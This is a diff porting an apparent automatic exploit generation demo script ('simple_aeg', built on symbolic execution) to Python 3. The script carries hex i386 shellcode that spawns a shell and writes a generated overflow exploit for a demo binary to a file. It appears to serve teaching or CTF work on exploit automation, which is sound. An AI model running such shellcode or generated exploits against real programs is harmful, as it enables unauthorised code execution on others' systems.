@@ -10,7 +10,7 @@ l = logging.getLogger("insomnihack.simple_aeg")
 
 
 # shellcraft i386.linux.sh
-shellcode = "6a68682f2f2f73682f62696e89e331c96a0b5899cd80".decode('hex')
+shellcode = bytes.fromhex("6a68682f2f2f73682f62696e89e331c96a0b5899cd80")
 
 def fully_symbolic(state, variable):
     '''
@@ -65,7 +65,7 @@ def main(binary):
     l.info("looking for vulnerability in '%s'", binary_name)
     exploitable_state = None
     while exploitable_state is None:
-        print sm
+        print(sm)
         sm.step()
         if len(sm.unconstrained) > 0:
             l.info("found some unconstrained states, checking exploitability")
@@ -102,16 +102,16 @@ def main(binary):
         return 1
 
     filename = '%s-exploit' % binary_name
-    with open(filename, 'w') as f:
+    with open(filename, 'wb') as f:
         f.write(ep.posix.dumps(0))
 
-    print "%s exploit in %s" % (binary_name, filename)
-    print "run with `(cat %s; cat -) | %s`" % (filename, binary)
+    print("%s exploit in %s" % (binary_name, filename))
+    print("run with `(cat %s; cat -) | %s`" % (filename, binary))
     return 0
 
 def test():
     main('./demo_bin')
-    assert subprocess.check_output('(cat ./demo_bin-exploit; echo echo BUMO) | ./demo_bin', shell=True) == 'BUMO\n'
+    assert subprocess.check_output('(cat ./demo_bin-exploit; echo echo BUMO) | ./demo_bin', shell=True) == b'BUMO\n'
 
 if __name__ == '__main__':
     # silence some annoying logs
@@ -121,4 +121,4 @@ if __name__ == '__main__':
     if len(sys.argv) > 1:
         sys.exit(main(sys.argv[1]))
     else:
-        print "%s: <binary>" % sys.argv[0]
+        print("%s: <binary>" % sys.argv[0])
